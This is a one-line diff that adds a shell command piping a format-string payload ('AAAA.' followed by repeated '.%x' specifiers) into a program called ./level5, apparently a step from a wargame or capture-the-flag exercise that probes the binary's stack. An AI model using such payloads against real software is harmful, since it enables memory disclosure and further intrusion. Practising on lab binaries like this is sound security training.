@@ -1,0 +1,1 @@
+python -c 'print("AAAA." + ".%x"*15)' | ./level5
